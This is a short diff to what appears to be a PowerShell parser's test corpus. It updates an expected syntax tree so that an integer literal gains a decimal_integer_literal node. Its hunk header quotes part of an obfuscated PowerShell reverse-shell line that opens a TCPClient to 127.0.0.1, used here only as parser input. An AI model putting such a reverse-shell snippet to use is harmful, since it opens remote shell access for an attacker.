@@ -368,4 +368,5 @@ $rih2ymeurlleflu = & "New-Object" "System.Net.Sockets.TCPClient"("127.0.0.1", 44
                             (multiplicative_argument_expression
                               (format_argument_expression
                                 (range_argument_expression
-                                  (integer_literal))))))))))))))))))
+                                  (integer_literal
+                                    (decimal_integer_literal)))))))))))))))))))
